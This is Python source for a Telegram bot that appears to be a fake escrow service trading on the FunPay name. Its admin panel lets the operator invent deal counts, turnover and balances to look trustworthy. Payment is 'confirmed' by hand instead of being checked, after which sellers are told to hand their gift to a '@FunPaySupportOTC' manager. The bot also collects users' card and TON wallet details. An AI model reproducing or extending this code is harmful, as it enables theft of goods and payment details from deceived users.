async def handle_text_messages(message: Message):
    user_id = message.from_user.id
    
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1")
        return

    # Обработка админских команд
    if user_id == ADMIN_ID and user_id in admin_states:
        state = admin_states[user_id]
        text = message.text.strip()
        
        if state == "waiting_ban_id":
            if text.isdigit():
                banned_users.add(int(text))
                await message.answer("✅ Пользователь заблокирован")
                del admin_states[user_id]
            else:
                await message.answer("❌ Неверный ID")
                
        elif state == "waiting_send_money":
            parts = text.split()
            if len(parts) == 2 and parts[0].isdigit():
                target = int(parts[0])
                try:
                    amount = float(parts[1])
                    user_balances[target] = user_balances.get(target, 0) + amount
                    await message.answer(f"✅ Переведено {amount} RUB пользователю {target}")
                    del admin_states[user_id]
                except:
                    await message.answer("❌ Ошибка суммы")
            else:
                await message.answer("❌ Формат: ID СУММА")
        
        elif state.startswith("waiting_"):
            parts = text.split()
            if len(parts) == 2 and parts[0].isdigit():
                target = int(parts[0])
                try:
                    value = int(parts[1]) if state != "waiting_turnover" else float(parts[1])
                    
                    if target not in user_stats:
                        user_stats[target] = {"successful": 0, "total": 0, "turnover": 0}
                    
                    if state == "waiting_successful_deals":
                        user_stats[target]["successful"] = value
                        await message.answer(f"✅ Установлено {value} успешных сделок")
                    elif state == "waiting_total_deals":
                        user_stats[target]["total"] = value
                        await message.answer(f"✅ Установлено {value} общих сделок")
                    elif state == "waiting_turnover":
                        user_stats[target]["turnover"] = value
                        await message.answer(f"✅ Установлен оборот {value} RUB")
                    
                    del admin_states[user_id]
                except:
                    await message.answer("❌ Ошибка значения")
            else:
                await message.answer("❌ Формат: ID ЗНАЧЕНИЕ")
        return

    # Обработка ввода сделки
    if user_id in user_deals:
        deal_data = user_deals[user_id]
        lang = user_languages.get(user_id, "ru")
        
        if deal_data.get("step") == "description":
            deal_data["description"] = message.text
            deal_data["step"] = "currency"
            
            if lang == "ru":
                await message.answer("Выберите валюту:", reply_markup=currency_keyboard_ru)
            else:
                await message.answer("Choose currency:", reply_markup=currency_keyboard_en)
                
        elif deal_data.get("step") == "amount":
            try:
                amount = float(message.text)
                deal_data["amount"] = amount
                
                # Создаем сделку
                deal_id = generate_deal_id()
                bot_username = (await bot.get_me()).username
                deal_link = f"https://t.me/{bot_username}?start=deal_{deal_id}"
                
                active_deals[deal_id] = {
                    "seller_id": user_id,
                    "seller_username": message.from_user.username or "Не указан",
                    "description": deal_data["description"],
                    "type": deal_data["type"],
                    "currency": deal_data["currency"],
                    "amount": amount,
                    "buyer_id": None,
                    "status": "created",
                    "admin_message_id": None
                }
                
                if lang == "ru":
                    await message.answer(
                        f"✅ <b>Сделка создана!</b>\n\n"
                        f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                        f"💰 <b>Сумма:</b> {amount} {deal_data['currency']}\n"
                        f"📝 <b>Описание:</b>\n{deal_data['description']}\n\n"
                        f"🔗 <b>Ссылка для покупателя:</b>\n"
                        f"<code>{deal_link}</code>\n\n"
                        f"📞 <b>Поддержка:</b> @FunPaySupportOTC",
                        parse_mode=ParseMode.HTML
                    )
                else:
                    await message.answer(
                        f"✅ <b>Deal created!</b>\n\n"
                        f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                        f"💰 <b>Amount:</b> {amount} {deal_data['currency']}\n"
                        f"📝 <b>Description:</b>\n{deal_data['description']}\n\n"
                        f"🔗 <b>Buyer link:</b>\n"
                        f"<code>{deal_link}</code>\n\n"
                        f"📞 <b>Support:</b> @FunPaySupportOTC",
                        parse_mode=ParseMode.HTML
                    )
                
                del user_deals[user_id]
                
            except ValueError:
                if lang == "ru":
                    await message.answer("❌ Введите корректное число")
                else:
                    await message.answer("❌ Enter valid number")
        return

    # Обработка реквизитов
    text = message.text
    if " - " in text and any(char.isdigit() for char in text):
        # Добавление карты
        if user_id not in user_requisites:
            user_requisites[user_id] = {}
        user_requisites[user_id]["card"] = text
        lang = user_languages.get(user_id, "ru")
        await message.answer("✅ Карта успешно добавлена" if lang == "ru" else "✅ Card successfully added")
    elif len(text) > 30 and text.startswith("UQ"):
        # Добавление TON кошелька
        if user_id not in user_requisites:
            user_requisites[user_id] = {}
        user_requisites[user_id]["ton"] = text
        lang = user_languages.get(user_id, "ru")
        await message.answer("✅ TON кошелек успешно добавлен" if lang == "ru" else "✅ TON wallet successfully added")

# Админские callback
@dp.callback_query(F.data == "sierrateam_read")
async def sierrateam_read_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    await safe_edit_message(
        callback,
        "👑 <b>Админ-панель FunPay OTC</b>\n\n"
        "Выберите действие:",
        admin_keyboard
    )

@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await safe_edit_message(callback, "Введите ID пользователя для блокировки:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_send_money"
    await safe_edit_message(callback, "Введите: ID СУММА")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await safe_edit_message(callback, "Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await safe_edit_message(callback, "Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        await callback.answer("❌ Нет доступа", show_alert=True)
        return
        
    admin_states[callback.from_user.id] = "waiting_turnover"
    await safe_edit_message(callback, "Введите: ID СУММА")

# Callback для сделок
@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    # Находим сделку где пользователь покупатель
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "active":
            deal["status"] = "waiting_admin"
            await callback.message.edit_text(
                "✅ <b>Оплата подтверждена!</b>\n\n"
                "Ожидаем проверки администратора...\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            
            # Уведомляем админа
            await bot.send_message(
                ADMIN_ID,
                f"🧾 <b>Покупатель подтвердил оплату</b>\n\n"
                f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n"
                f"👤 <b>Продавец:</b> @{deal['seller_username']}\n"
                f"🛒 <b>Покупатель:</b> @{deal['buyer_username']}\n\n"
                f"📞 <b>Поддержка:</b> @FunPaySupportOTC",
                reply_markup=admin_payment_keyboard,
                parse_mode=ParseMode.HTML
            )
            active_deals[deal_id]["admin_message_id"] = callback.message.message_id
            break

@dp.callback_query(F.data == "admin_payment_ok")
async def admin_payment_ok_callback(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID:
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("status") == "waiting_admin":
            deal["status"] = "payment_confirmed"
            
            # Уведомляем продавца
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            if seller_lang == "ru":
                await bot.send_message(
                    deal["seller_id"],
                    f"✅ <b>Оплата подтверждена!</b>\n\n"
                    f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @FunPaySupportOTC\n\n"
                    f"После отправки нажмите кнопку ниже:",
                    reply_markup=seller_gift_keyboard,
                    parse_mode=ParseMode.HTML
                )
            else:
                await bot.send_message(
                    deal["seller_id"],
                    f"✅ <b>Payment confirmed!</b>\n\n"
                    f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                    f"💰 <b>Amount:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>IMPORTANT:</b> Send gift to manager @FunPaySupportOTC\n\n"
                    f"After sending click button below:",
                    reply_markup=seller_gift_keyboard,
                    parse_mode=ParseMode.HTML
                )
            
            await callback.message.edit_text(
                "✅ <b>Оплата подтверждена администратором</b>\n\n"
                "Продавец уведомлен об отправке подарка.",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "item_sent")
async def item_sent_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("seller_id") == user_id and deal["status"] == "payment_confirmed":
            deal["status"] = "item_sent"
            
            # Уведомляем покупателя
            await bot.send_message(
                deal["buyer_id"],
                "🔔 <b>Продавец отправил товар!</b>\n\n"
                "Пожалуйста, проверьте получение и подтвердите:",
                reply_markup=buyer_confirmation_keyboard,
                parse_mode=ParseMode.HTML
            )
            
            await callback.message.edit_text(
                "✅ <b>Вы подтвердили отправку</b>\n\n"
                "Ожидаем подтверждения от покупателя...\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "buyer_confirm_ok")
async def buyer_confirm_ok_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "item_sent":
            deal["status"] = "completed"
            
            # Обновляем статистику
            if deal["seller_id"] not in user_stats:
                user_stats[deal["seller_id"]] = {"successful": 0, "total": 0, "turnover": 0}
            user_stats[deal["seller_id"]]["successful"] += 1
            user_stats[deal["seller_id"]]["total"] += 1
            user_stats[deal["seller_id"]]["turnover"] += deal["amount"]
            
            # Уведомляем участников
            await callback.message.edit_text(
                "🎉 <b>Сделка успешно завершена!</b>\n\n"
                "Спасибо за использование GiftBadge!\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            await bot.send_message(
                deal["seller_id"],
                "🎉 <b>Сделка успешно завершена!</b>\n\n"
                "Средства зачислены на ваш баланс.\n"
                "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            
            # Удаляем сделку
            del active_deals[deal_id]
            break

@dp.callback_query(F.data == "buyer_confirm_fail")
async def buyer_confirm_fail_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "item_sent":
            await callback.message.edit_text(
                "⚠️ <b>Вы сообщили о проблеме</b>\n\n"
                "Пожалуйста, свяжитесь с поддержкой:\n"
                "@FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            await bot.send_message(
                deal["seller_id"],
                "⚠️ <b>Покупатель сообщил о проблеме</b>\n\n"
                "Пожалуйста, свяжитесь с поддержкой:\n"
                "@FunPaySupportOTC",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "confirm_cancel")
async def confirm_cancel_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(callback, "✅ Сделка успешно отменена.")
    else:
        await safe_edit_message(callback, "✅ Deal successfully cancelled.")

@dp.callback_query(F.data == "read_deposit")
async def read_deposit_callback(callback: CallbackQuery):
    if callback.from_user.id in banned_users:
        await callback.answer("❌ Вы были заблокированы в боте за нарушение правил, пункт 3.1", show_alert=True)
        return
        
    lang = user_languages.get(callback.from_user.id, "ru")
    
    if lang == "ru":
        await safe_edit_message(
            callback,
            "💳 <b>Пополнение баланса</b>\n\n"
            "Выберите способ пополнения:",
            deposit_method_keyboard_ru
        )
    else:
        await safe_edit_message(
            callback,
            "💳 <b>Balance Top-up</b>\n\n"
            "Choose top-up method:",
            deposit_method_keyboard_en
        )

# Запуск бота
async def main():
    print("🎁 FunPay Bot запускается...")
    print(f"📞 Поддержка: {SUPPORT_USERNAME}")
    print(f"👑 Админ ID: {ADMIN_ID}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())